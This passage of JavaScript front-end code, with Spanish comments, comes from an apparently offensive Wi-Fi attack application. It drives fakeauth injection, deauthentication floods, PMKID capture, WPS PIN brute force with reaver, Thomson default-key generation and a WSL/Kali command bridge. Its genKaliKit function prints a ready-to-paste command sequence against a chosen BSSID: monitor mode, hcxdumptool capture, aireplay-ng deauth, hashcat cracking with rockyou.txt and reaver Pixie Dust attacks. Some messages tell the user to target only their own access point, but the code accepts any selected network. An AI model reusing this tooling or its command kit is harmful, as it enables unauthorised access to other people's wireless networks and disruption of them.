      return invokeAttack('thomson_run', { ssid, bssid, maxKeys });
    }
    const r = await window.__invoke('keygen_run', { ssid, bssid });
    const pre = $('keygen-out');
    if (pre) pre.textContent = r.success ? r.output : r.stderr;
    log(r.success ? '[keygen] candidatos generados.' : `[keygen] ${r.stderr}`, r.success ? 'ok' : 'warn');
  } catch (e) {
    log(`[keygen] ERROR: ${e}`, 'error');
  }
};

// ── Background attack state ──────────────────────────────────────────────
let currentAttackId = null;

window.cancelCurrentAttack = async function () {
  window._autoStop = true; // si hay un auto-attack en curso, la secuencia se detiene
  if (!currentAttackId) {
    log('No hay ataque en ejecución para cancelar.', 'warn');
    return;
  }
  const id = currentAttackId;
  log(`Cancelando ataque '${id}'…`, 'warn');
  try {
    const result = await window.__invoke('cancel_attack', { attackId: id });
    log(result.success ? `✅ ${result.output}` : `⚠️ ${result.output}`, result.success ? 'ok' : 'warn');
  } catch (err) {
    log(`Error al cancelar: ${err}`, 'error');
  }
};

window.injectionTest = async function () {
  const iface = valOrEmpty($('injtest-iface').value) || '';
  log(`>>> Injection test en ${iface || '(interfaz requerida)'}…`, 'info');
  return invokeAttack('injection_test', { iface: iface || undefined });
};

window.doFakeauth = async function () {
  const bssid = valOrEmpty($('fakeauth-bssid').value);
  const mac   = valOrEmpty($('fakeauth-mac').value) || undefined;
  const iface = valOrEmpty($('fakeauth-iface').value) || '';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Fakeauth: AP=${bssid} mac=${mac || '00:11:22:33:44:55'} iface=${iface || '(requerida)'}`, 'warn');
  showProgress(true);
  return invokeAttack('fakeauth_inject', { bssid, sourceMac: mac, iface });
};

// ── Progress bar support ──────────────────────────────────────────────────────
const progressContainer = document.getElementById('progress-container');
const progressBar = document.getElementById('progress-bar');

// Visibilidad del panel verbose (declarado antes de showProgress, que la lee).
let liveVisible = true;

function showProgress(show = true) {
  if (progressContainer) progressContainer.style.display = show ? 'block' : 'none';
  if (show) {
    // Reset del panel verbose al iniciar un ataque, respetando si el usuario lo
    // plegó. Antes nadie mostraba #live-cv (tenía display:none inline), así que
    // la «salida en vivo» era una zona invisible de la UI.
    _liveBuf = '';
    const cv = $('live-cv');
    if (cv) {
      cv.style.display = liveVisible ? 'block' : 'none';
      cv.textContent = '─ Salida en tiempo real (stdout/stderr del ataque) ─';
    }
  }
}

function updateProgress(percent, text) {
  if (progressBar) {
    progressBar.style.width = `${Math.min(100, Math.max(0, percent))}%`;
    progressBar.textContent = text || `${percent}%`;
  }
}

// ── Salida verbose en tiempo real (panel live bajo la barra de progreso) ──
window.toggleLive = function () {
  liveVisible = !liveVisible;
  const cv = $('live-cv');
  const btn = $('live-toggle');
  if (cv) cv.style.display = liveVisible ? 'block' : 'none';
  if (btn) btn.innerHTML = liveVisible ? '&#x1F4FA; Ocultar verbose' : '&#x1F4FA; Verbose oculto (clic para ver)';
  if (liveVisible) _flushLive(); // vuelca lo acumulado mientras estaba plegado
};

// Limpia el panel de salida viva (antes el botón solo vaciaba el DOM y el buffer
// pendiente se volcaba en el siguiente evento, así que «Limpiar» parecía no hacer nada).
window.clearLive = function () {
  _liveBuf = '';
  const cv = $('live-cv');
  if (cv) cv.textContent = '─ Salida en tiempo real (stdout/stderr del ataque) ─';
};

// El panel live recibe un evento por línea de stdout/stderr: se acumula el
// texto y se vuelca en un solo frame (un append + un scroll por ráfaga).
let _liveBuf = '';
let _liveColor = '#b8b8d0';
let _liveFlushQueued = false;
function _flushLive() {
  _liveFlushQueued = false;
  const cv = $('live-cv');
  if (!cv || !_liveBuf) return;
  // Panel no visible (otro tab, o verbose plegado): cero trabajo de layout. El
  // texto se acumula acotado y se vuelca al volver al tab (showTab lo fuerza).
  const panelVisible = cv.style.display !== 'none'
    && $('tab-attack')?.classList.contains('active');
  if (!panelVisible) {
    if (_liveBuf.length > 32768) _liveBuf = _liveBuf.slice(-32768);
    return;
  }
  const span = document.createElement('span');
  span.style.color = _liveColor;
  span.textContent = _liveBuf;
  _liveBuf = '';
  cv.appendChild(span);
  // Cap de contenido: conserva los últimos ~400 nodos para no crecer sin fin.
  while (cv.childNodes.length > 400) cv.removeChild(cv.firstChild);
  queueScroll(cv);
}
function liveAppend(txt, level) {
  if (!txt) return;
  // Colorea por nivel: stderr/negativo en rojo suave, stdout normal.
  // Si cambia el nivel a mitad de ráfaga, vuelca lo acumulado primero.
  const color = level === 'stderr' ? '#f07178' : '#b8b8d0';
  if (_liveBuf && _liveColor !== color) _flushLive();
  _liveColor = color;
  _liveBuf += txt.endsWith('\n') ? txt : txt + '\n';
  // Evita un nodo DOM gigante: vuelca cada ~32 KB.
  if (_liveBuf.length > 32768) { _flushLive(); return; }
  if (_liveFlushQueued) return;
  _liveFlushQueued = true;
  if (typeof requestAnimationFrame === 'function') requestAnimationFrame(_flushLive);
  else setTimeout(_flushLive, 120);
}

// Listen for attack progress events (streaming en tiempo real).
// Acepta dos orígenes: ataques en background (id = currentAttackId) y comandos
// síncronos (run_bin emite con id="sync" — se muestra si no hay bg en curso,
// para no mezclar salidas de un ataque bg y un síncrono simultáneos).
//
// RENDIMIENTO: los eventos llegan a ráfagas; procesarlos uno a uno (log + live +
// includes) saturaba el hilo de UI justo cuando el ataque está en marcha —síntoma
// real: «voy a Consola y ya no vuelvo»—. Ahora se encolan y se vuelcan UNA vez
// por frame, con techo de eventos por frame y de cola.
const EVT_MAX_PER_FRAME = 300;
const _evtQueue = [];
let _evtFlushQueued = false;

function _flushEvents() {
  _evtFlushQueued = false;
  if (!_evtQueue.length) return;
  const batch = _evtQueue.splice(0, EVT_MAX_PER_FRAME);
  const skipped = _evtQueue.length;   // resto de la ráfaga: se resume en 1 línea
  if (skipped) _evtQueue.length = 0;
  let last = '';
  for (const p of batch) {
    log(p.data, p.type === 'stderr' ? 'warn' : 'output');
    liveAppend(p.data, p.type);
    last = p.data;
  }
  const low = last.toLowerCase();
  if (low.includes('received')) updateProgress(25, 'Recibiendo... 25%');
  if (low.includes('pmkid')) updateProgress(50, 'PMKID encontrado! 50%');
  if (low.includes('beacon')) updateProgress(75, 'Procesando beacons... 75%');
  if (skipped) log(`… ${skipped} eventos de salida omitidos en la consola (ataque muy verbose; la vista en vivo sigue activa)`, 'warn');
}

listen('attack-progress', (event) => {
  const { id, type, data } = event.payload;
  if (type !== 'stdout' && type !== 'stderr') return;
  const isSync = id === 'sync' && !currentAttackId;
  if (id !== currentAttackId && !isSync) return;
  if (isSync) {
    // Solo la primera vez: showProgress(true) reinicia el panel de salida viva.
    const pc = $('progress-container');
    if (pc && pc.style.display === 'none') showProgress(true);
  }
  _evtQueue.push({ type, data });
  // Techo de cola: si el ataque inunda, se conserva lo último (lo anterior ya
  // está en el historial de la consola) — nunca crecer sin límite.
  if (_evtQueue.length > EVT_MAX_PER_FRAME * 4) {
    _evtQueue.splice(0, _evtQueue.length - EVT_MAX_PER_FRAME * 4);
  }
  if (!_evtFlushQueued) {
    _evtFlushQueued = true;
    if (typeof requestAnimationFrame === 'function') requestAnimationFrame(_flushEvents);
    else setTimeout(_flushEvents, 60);
  }
});

listen('attack-started', (event) => {
  const { id, cmdline } = event.payload;
  // Los ataques bg emiten attack-started: activa el lock (por si el flujo no
  // pasó por invokeAttack) y muestra la línea de comando exacta.
  if (id && currentAttackId && id !== currentAttackId) return;
  currentAttackId = id || currentAttackId;
  setAttackRunning(true, cmdline || 'Ataque en curso…');
  if (cmdline) log(`$ ${cmdline}`, 'info');
});

listen('attack-completed', (event) => {
  const { id } = event.payload;
  if (id === currentAttackId) {
    showProgress(false);
    setAttackRunning(false);
    currentAttackId = null;
  }
});

listen('attack-error', (event) => {
  const { id, error } = event.payload;
  if (id === currentAttackId) {
    showProgress(false);
    setAttackRunning(false);
    log(`Error ataque: ${error}`, 'error');
    currentAttackId = null;
  }
});

// ── Puente WSL2/Kali (ROADMAP_WSL2 Fase 5) ──────────────────────────────
window.wslBusid = function () {
  const el = document.getElementById('wsl-busid');
  return (el && el.value || '1-5').trim();
};
window.doWslAttach = async function () {
  const status = document.getElementById('wsl-status');
  if (status) status.textContent = 'Estado: attach…';
  log(`Moviendo USB ${window.wslBusid()} a Kali…`, 'info');
  try {
    const r = await window.__invoke('wsl_attach', { busid: window.wslBusid() });
    log(`[${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
    if (r.stdout) log(r.stdout, 'info');
    if (!r.success && r.stderr) log(r.stderr, 'warn');
    if (status) status.textContent = r.success ? 'Estado: ✅ Kali (USB attach)' : 'Estado: ❌ attach fallido';
  } catch (err) { log(`[wsl_attach] FATAL: ${err}`, 'error'); if (status) status.textContent = 'Estado: ❌ error'; }
};
window.doWslDetach = async function () {
  const status = document.getElementById('wsl-status');
  if (status) status.textContent = 'Estado: detach…';
  log(`Devolviendo USB ${window.wslBusid()} a Windows…`, 'info');
  try {
    const r = await window.__invoke('wsl_detach', { busid: window.wslBusid() });
    log(`[${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
    if (r.stdout) log(r.stdout, 'info');
    if (!r.success && r.stderr) log(r.stderr, 'warn');
    if (status) status.textContent = r.success ? 'Estado: 🔒 Windows (USB devuelto)' : 'Estado: ❌ detach fallido';
  } catch (err) { log(`[wsl_detach] FATAL: ${err}`, 'error'); if (status) status.textContent = 'Estado: ❌ error'; }
};
window.doWslExec = async function () {
  const el = document.getElementById('wsl-cmd');
  const raw = (el && el.value || 'echo ok').trim() || 'echo ok';
  const parts = raw.split(/\s+/);
  const command = parts[0];
  const args = parts.slice(1);
  log(`>>> Kali: ${raw}`, 'info');
  try {
    const r = await window.__invoke('wsl_exec', { command, args });
    if (r.stdout) log(r.stdout, 'ok');
    if (r.stderr) log(r.stderr, r.success ? 'info' : 'warn');
    log(`[${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
  } catch (err) { log(`[wsl_exec] FATAL: ${err}`, 'error'); }
};
window.wslTarget = function () {
  const b = document.getElementById('wsl-bssid');
  const c = document.getElementById('wsl-chan');
  return {
    bssid: (b && b.value || '').trim(),
    channel: c && parseInt(c.value) ? parseInt(c.value) : 11
  };
};
window.wslShow = async function (tag, p) {
  try {
    const r = await p;
    if (r.stdout) log(r.stdout, 'ok');
    if (r.stderr) log(r.stderr, r.success ? 'info' : 'warn');
    log(`[${tag} ${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
  } catch (err) { log(`[${tag}] FATAL: ${err}`, 'error'); }
};
// ── WSL streams en vivo (verbose real de Kali en el panel) ─────────────
// Igual que invokeAttack pero con los comandos wsl_*_stream que emiten
// attack-progress desde dentro de Kali: la salida de hcxdumptool/airodump/
// aireplay se ve EN VIVO en el panel del tab Ataque.
async function invokeWslStream(cmd, args) {
  if (attackIsBusy()) { log(`⚠️ Ya hay un ataque en curso; deténlo antes.`, 'warn'); return false; }
  log(`>>> Kali (streaming): ${cmd} ${JSON.stringify(args)}`, 'info');
  setAttackRunning(true, 'Kali: ' + cmd.replace('wsl_', '').replace('_stream', '') + ' en curso…');
  showProgress(true);
  currentAttackId = cmd.replace(/_/g, '') + '_stream';
  const t0 = performance.now();
  try {
    const r = await window.__invoke(cmd, args);
    const ms = Math.round(performance.now() - t0);
    // El verbose ya llegó en vivo vía attack-progress; aquí solo el cierre.
    if (r?.stderr) log(`[Kali stderr] ${r.stderr}`, 'warn');
    log(r?.success ? `✅ Kali terminó OK (${ms} ms)` : `⚠️ Kali finalizó (exit=${r?.exit_code ?? '?'}) en ${ms} ms`, r?.success ? 'ok' : 'warn');
    return !!r?.success;
  } catch (err) {
    log(`[FATAL ${cmd}] ${err}`, 'error');
    return false;
  } finally {
    currentAttackId = null;
    showProgress(false);
    setAttackRunning(false);
  }
}

window.wslStreamPmkid = function () {
  const ch = selectedChannel();
  return invokeWslStream('wsl_pmkid_stream', { iface: 'wlan0', channel: ch, durationSecs: 60 });
};
window.wslStreamAirodump = function () {
  const ch = selectedChannel();
  return invokeWslStream('wsl_airodump_stream', { iface: 'wlan0', channel: ch, durationSecs: 30 });
};
window.wslStreamDeauth = function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  return invokeWslStream('wsl_deauth_stream', { iface: 'wlan0', bssid, count: 10, channel: selectedChannel() });
};

window.doWslHealth = async function () {
  const line = document.getElementById('wsl-health-line');
  if (line) line.textContent = 'Estado Kali: verificando (6-15s, incluye probe RX)…';
  log('>>> Salud del puente Kali (distro + wlan0 + monitor + RX 6s)…', 'info');
  try {
    const r = await window.__invoke('wsl_health', { iface: 'wlan0' });
    // El informe viene línea a línea en stdout: cada paso con su veredicto.
    if (r.stdout) r.stdout.split('\n').filter(Boolean).forEach(l => log(l, l.includes('OK') || l.includes('VIVA') ? 'ok' : 'warn'));
    log(`[${r.success ? 'OK' : 'FALLO'}] ${r.message}`, r.success ? 'ok' : 'warn');
    if (line) {
      line.textContent = 'Estado Kali: ' + (r.success ? '✅ RF OPERATIVA — puedes atacar' : '❌ con fallos (ver consola)');
      line.style.color = r.success ? 'var(--green)' : 'var(--red)';
    }
  } catch (err) {
    log(`[wsl_health] FATAL: ${err}`, 'error');
    if (line) { line.textContent = 'Estado Kali: error inesperado (' + err + ')'; line.style.color = 'var(--red)'; }
  }
};
window.doWslPmkid = async function () {
  const t = window.wslTarget();
  log(`>>> Kali: PMKID ${t.channel} 60s…`, 'info');
  await window.wslShow('pmkid', window.__invoke('wsl_pmkid_capture', { iface: 'wlan0', channel: t.channel, durationSecs: 60 }));
};
window.doWslAirodump = async function () {
  const t = window.wslTarget();
  log(`>>> Kali: airodump ${t.channel} 20s…`, 'info');
  await window.wslShow('airodump', window.__invoke('wsl_airodump', { iface: 'wlan0', channel: t.channel, durationSecs: 20 }));
};
window.doWslWash = async function () {
  const t = window.wslTarget();
  log(`>>> Kali: wash ${t.channel} 20s…`, 'info');
  await window.wslShow('wash', window.__invoke('wsl_wash', { iface: 'wlan0', channel: t.channel, durationSecs: 20 }));
};
window.doWslDeauth = async function () {
  const t = window.wslTarget();
  if (!t.bssid) { log('Deauth cancelada: escribe el BSSID de TU ap.', 'warn'); return; }
  log(`>>> Kali: deauth x10 a ${t.bssid} (AP propio)…`, 'info');
  await window.wslShow('deauth', window.__invoke('wsl_deauth', { iface: 'wlan0', bssid: t.bssid, count: 10, channel: t.channel }));
};
window.doWslReaver = async function () {
  const t = window.wslTarget();
  if (!t.bssid) { log('Reaver cancelado: escribe el BSSID de TU ap.', 'warn'); return; }
  log(`>>> Kali: reaver 60s contra ${t.bssid} (AP propio)…`, 'info');
  await window.wslShow('reaver', window.__invoke('wsl_reaver', { iface: 'wlan0', bssid: t.bssid, channel: t.channel, durationSecs: 60 }));
};
window.doWslKill = async function () {
  log('>>> Kali: pkill -INT (hcxdumptool|airodump-ng|wash|aireplay-ng|reaver)…', 'info');
  for (const p of ['hcxdumptool', 'airodump-ng', 'wash', 'aireplay-ng', 'reaver']) {
    await window.wslShow('kill', window.__invoke('wsl_kill', { pattern: p }));
  }
};

// ── Veredicto de hardware (RT3070: informativo, sin bloqueos) ─────────────
// Al abrir el tab Ataque mide (check_injection_capability) si el adaptador
// inyecta y lo muestra en #hw-cap-line. NADA se bloquea: los botones siguen
// lanzables y el pipeline pasivo sigue siendo el camino principal.
window.applyHardwareGates = async function () {
  if (window._hwGatesDone) return;
  window._hwGatesDone = true;
  const line = $('hw-cap-line');
  let chip = '?', guid = null, supported = false, msg = '';
  try {
    const rep = await window.__invoke('detect_adapters');
    const ads = rep?.adapters || [];
    const cap = ads.find(a => a.monitor_capable) || ads[0];
    if (cap) { chip = cap.chipset || cap.name || '?'; guid = cap.guid || null; }
  } catch (e) { msg = 'detect_adapters falló: ' + e; }
  try {
    const inj = await window.__invoke('check_injection_capability', { ifaceGuid: guid || '' });
    supported = !!inj?.supported;
    msg = msg || inj?.message || '';
  } catch (e) { msg = msg || ('check_injection_capability falló: ' + e); }
  if (line) {
    line.classList.remove('ok', 'no');
    if (supported) {
      line.classList.add('ok');
      line.innerHTML = '<b>Hardware:</b> ' + esc(chip) + ' — <b style="color:var(--green)">TX disponible</b>: ataques activos listos.' + (msg ? ' <span style="color:var(--muted)">' + esc(msg) + '</span>' : '');
    } else {
      line.classList.add('no');
      line.innerHTML = '<b>Hardware:</b> ' + esc(chip) + ' — <b style="color:var(--orange)">captura pasiva</b> (sin TX/cambio de canal, límite driver/Npcap medido). ' +
        'Pipeline pasivo: captura &#8594; convertir &#8594; crack &#8594; keygen &#8594; conectar. RF activa: «Kit Kali» o Kali live USB.';
    }
  }
  log('Hardware: ' + chip + (supported ? ' con TX.' : ' en modo pasivo (sin TX).'), supported ? 'ok' : 'info');
};

// ── Kit Kali para el objetivo seleccionado ────────────────────────────────
// La RT3070 en Windows solo escucha; con Kali live USB (rt2800usb) la MISMA
// antena inyecta y cambia de canal. Este botón genera el bloque de comandos
// listos (hcxdumptool, aireplay, reaver, hashcat) para el objetivo elegido,
// sustituyendo BSSID/canal automáticamente.
window.genKaliKit = function () {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  const ssid = targetSsid() || 'TU_RED';
  const ch = selectedChannel() || 11;
  const out = $('kali-kit-out');
  const mac = bssid.replace(/:/g, '-');
  const kit = [
    '# ═══ KIT KALI LIVE USB — objetivo: ' + ssid + ' (' + bssid + ', canal ' + ch + ') ═══',
    '# 1) Arranca Kali live USB con la RT3070 enchufada (rt2800usb la toma nativa).',
    '# 2) Copia/pega estos comandos en la terminal de Kali:',
    '',
    '# Modo monitor + canal del objetivo',
    'sudo ip link set wlan0 down && sudo iw dev wlan0 set type monitor && sudo ip link set wlan0 up',
    'sudo iw dev wlan0 set channel ' + ch,
    '',
    '# Captura PMKID/EAPOL (30-60s; con --rds=1 salta canales si prefieres)',
    'sudo timeout 60 hcxdumptool -i wlan0 --enable_status=3 -o captura_' + mac + '.pcapng',
    '',
    '# (Opcional) forzar handshake: deauth SOLO a TU AP',
    'sudo aireplay-ng -0 5 -a ' + bssid + ' wlan0',
    '',
    '# Convertir y crackear (en Kali o de vuelta en Windows con la app)',
    'hcxpcapngtool -o hash.22000 captura_' + mac + '.pcapng',
    'hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt',
    '',
    '# WPS (si el AP lo tiene: wash -i wlan0)',
    'sudo reaver -i wlan0 -b ' + bssid + ' -vv -K 1   # Pixie Dust',
    'sudo reaver -i wlan0 -b ' + bssid + ' -vv        # PIN bruteforce',
    '',
    '# El .pcapng lo puedes traer de vuelta a Windows y rematar aquí:',
    '#   tab Ataque → paso C (Convertir) → paso D (Crack hashcat).',
  ].join('\n');
  if (out) {
    out.textContent = kit;
    out.style.display = 'block';
  }
  log('Kit Kali generado para ' + ssid + ' (' + bssid + ', CH' + ch + '). Copia los comandos a la terminal de Kali live USB.', 'ok');
};
